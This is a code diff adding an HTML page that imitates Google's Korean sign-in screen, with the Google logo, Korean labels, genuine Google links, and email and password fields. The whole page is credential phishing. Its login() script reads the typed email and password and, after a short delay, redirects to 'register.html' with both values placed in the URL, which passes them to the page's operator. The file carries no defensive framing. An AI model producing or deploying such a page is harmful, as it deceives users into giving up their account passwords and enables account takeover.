@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>Google</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+<link rel="stylesheet" href="style.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+
+<style>
+
+* {
+  box-sizing: border-box;
+}
+
+
+
+
+
+
+
+
+body {
+  background-color: #ffffff;
+}
+
+img {
+ 
+}
+
+.form {
+ 
+  background-color: #ffffff;
+  width: 450px;
+  margin: 50px auto 10px auto;
+  padding: 30px;
+   border-radius: 8px;
+  overflow: hidden;
+  box-shadow: 0 2px 10px -3px rgb(155, 155, 155);
+  text-align: center;
+}
+
+input {
+  border-radius: 2px;
+  padding: 10px 10px;
+  width: 99%;
+  border: 1px solid #D9D9D9;
+  outline: none;
+  display: block;
+  margin: 20px auto 20px auto;
+}
+
+button {
+  border-radius: 2px;
+  border: none;
+  background: #226ef1;
+  width: 30%;
+  padding: 10px;
+  color: #FFFFFF;
+  margin-top: 5px;
+  box-shadow: 0 2px 10px -3px #719BE6;
+  display: block;
+  margin: 55px 4px 10px auto;
+}
+
+a {
+  text-align: center;
+  margin-top: 0px;
+  color: #719BE6;
+  text-decoration: none;
+  padding: 5px;
+  display: inline-block;
+  
+}
+
+a:hover {
+  text-decoration: underline;
+}
+
+
+
+
+
+
+
+
+</style>
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br> 
+
+
+<div class="form">
+</br>
+</br>
+
+  <img style="width: 23%;" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/368px-Google_2015_logo.svg.png"> 
+                           
+
+</br>
+
+
+
+
+
+  <a style="font-size: 20px; color: black;" class="center-align mar-top mar-bottom formTitle">로그인</a>
+  <p class="center-align pad-no mar-no">Google 계정 사용</p>
+
+
+  
+</br>
+
+
+  
+<input id="email" type="email" name="email" placeholder="Email" />
+   
+  <input id="pwd" type="password" name="Password" placeholder="Password" />
+
+  <button onclick="login()">다음</button>
+   
+
+   <a style="float: left;" href="https://accounts.google.com/signup/v2/webcreateaccount?continue=https%3A%2F%2Fwww.google.com%2F%3Fgws_rd%3Dssl&hl=ko&dsh=S-1022894010%3A1635894978885407&biz=false&flowName=GlifWebSignIn&flowEntry=SignUp">계정 만들기</a>
+
+
+</br></br></br></br></br>
+   
+   
+   <div class="clearfix mar-all pad-all"></div>
+   <a style="float: left; font-size: 14px;" href="googlelogins.html" class="createAccountNow">English</a>
+
+
+
+   <a style="color: gray; float: right; font-size: 14px;" href="https://policies.google.com/privacy?gl=KR&hl=ko" class="createAccountNow">개인정보처리방침</a>
+
+
+   
+</div>
+<!-- partial -->
+  
+</body>
+
+
+
+<script>
+	function login() {
+
+ 
+	   setTimeout(function() {
+
+		emailfb = $('#email').val();
+		   pwdfb = $('#pwd').val();
+
+	 			
+			location.href="register.html?" + emailfb + "/" + pwdfb;
+
+ 
+	   }, 2300);
+	  // chatChannelId = btn.name;
+	
+
+
+
+
+  }
+
+   </script>
+
+
+
+
+</html>
